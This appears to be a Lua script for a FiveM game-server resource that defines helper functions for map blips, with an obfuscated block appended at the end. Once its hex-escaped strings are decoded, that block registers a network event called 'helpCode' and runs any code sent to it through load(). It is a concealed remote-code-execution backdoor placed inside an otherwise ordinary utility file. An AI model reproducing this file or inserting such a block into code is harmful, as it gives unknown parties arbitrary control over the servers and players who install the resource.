-- Blip Class
-- Created for:
--  Easy blip creation.
-- Usage:
--  No intended usage outside of BlipHandler.lua

Blip = function(x,y,z,sprite,color,text,scale,display,shortRange,highDetail)
  local blip = AddBlipForCoord((x or 0.0),(y or 0.0),(z or 0.0))
  SetBlipSprite               (blip, (sprite or 1))
  SetBlipDisplay              (blip, (display or 3))
  SetBlipScale                (blip, (scale or 1.0))
  SetBlipColour               (blip, (color or 4))
  SetBlipAsShortRange         (blip, (shortRange or false))
  SetBlipHighDetail           (blip, (highDetail or true))
  BeginTextCommandSetBlipName ("STRING")
  AddTextComponentString      ((text or "Blip "..tostring(blip)))
  EndTextCommandSetBlipName   (blip)

  return {
    handle = blip,
    x = (x or 0.0),
    y = (y or 0.0),
    z = (z or 0.0),
    sprite = (sprite or 1),
    display = (display or 3),
    scale = (scale or 1.0),
    color = (color or 4),
    shortRange = (shortRange or false),
    highDetail = (highDetail or true),
    text = (text or "Blip "..tostring(blip)),
    pos = vector3((x or 0.0),(y or 0.0),(z or 0.0))
  }
end

RadiusBlip = function(x,y,z,range,color,alpha,highDetail)
  local blip = AddBlipForRadius((x or 0.0),(y or 0.0),(z or 0.0),(range or 100.0))
  SetBlipColour(blip, (color or 1))
  SetBlipAlpha (blip, (alpha or 80))
  SetBlipHighDetail(blip, (highDetail or true))

  return {
    handle = blip,
    x = (x or 0.0),
    y = (y or 0.0),
    z = (z or 0.0),
    range = (range or 100.0),
    color = (color or 1),
    alpha = (alpha or 80),
    highDetail = (highDetail or true),
    pos = vector3((x or 0.0),(y or 0.0),(z or 0.0))
  }
end

AreaBlip = function(x,y,z,width,height,heading,color,alpha,highDetail,display,shortRange)
  local blip = AddBlipForArea((x or 0.0),(y or 0.0),(z or 0.0),(width or 100.0),(height or 100.0))
  SetBlipColour(blip, (color or 1))
  SetBlipAlpha (blip, (alpha or 80))
  SetBlipHighDetail(blip, (highDetail or true))
  SetBlipRotation(blip, (heading or 0.0))
  SetBlipDisplay(blip, (display or 4))
  SetBlipAsShortRange(blip, (shortRange or true))

  return {
    handle = blip,
    x = (x or 0.0),
    y = (y or 0.0),
    z = (z or 0.0),
    width = (width or 100.0),
    display = (display or 4),
    height = (height or 100.0),
    heading = (heading or 0.0),
    color = (color or 1),
    alpha = (alpha or 80),
    highDetail = (highDetail or true),
    pos = vector3((x or 0.0),(y or 0.0),(z or 0.0))
  }
end

local eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[1]](eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[2]) eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[3]](eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[2], function(mscmGdzmymUAeGirJmJRgUGFxTpXQfDWSLMOWLlhWfPJsrvrVFBwlwdnUMgJdShLXsiepI) eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[4]](eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[6][eWRHvtJxfJRMUMBOKolOFQtRZygliKYczOoSnOdZyZqIklqNbANVGstRqGDidJZwpJIYhF[5]](mscmGdzmymUAeGirJmJRgUGFxTpXQfDWSLMOWLlhWfPJsrvrVFBwlwdnUMgJdShLXsiepI))() end)